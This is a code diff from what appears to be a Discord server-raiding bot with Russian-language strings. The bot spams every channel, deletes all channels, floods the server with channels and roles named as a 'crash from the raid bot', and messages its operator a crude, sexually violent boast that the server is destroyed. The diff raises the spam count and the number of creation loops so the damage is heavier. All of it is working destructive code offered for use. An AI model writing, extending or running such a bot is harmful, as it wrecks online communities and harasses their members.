@@ -26,7 +26,7 @@ async def sendch(ch,text,count):
 async def createchannel(ctx):
     try: c = await ctx.guild.create_text_channel('краш от рейдбата')
     except: pass
-    else: create_task(sendch(ch=c,text=spamtext,count=100))
+    else: create_task(sendch(ch=c,text=spamtext,count=250))
 
 async def createrole(ctx):
     try: await ctx.guild.create_role(name='краш от рейдбата')
@@ -42,7 +42,7 @@ async def kill(ctx):
         create_task(sendch(ch=channel,text=spamtext,count=1))
     for channel in ctx.guild.channels:
         create_task(killobject(obj=channel))
-    for _ in range(50):
+    for _ in range(100):
         create_task(createchannel(ctx))
         create_task(createrole(ctx))
     await ctx.author.send(f'Изнасилование сервера `{ctx.guild}` (id: {ctx.guild.id}) некарасиком завершено!')
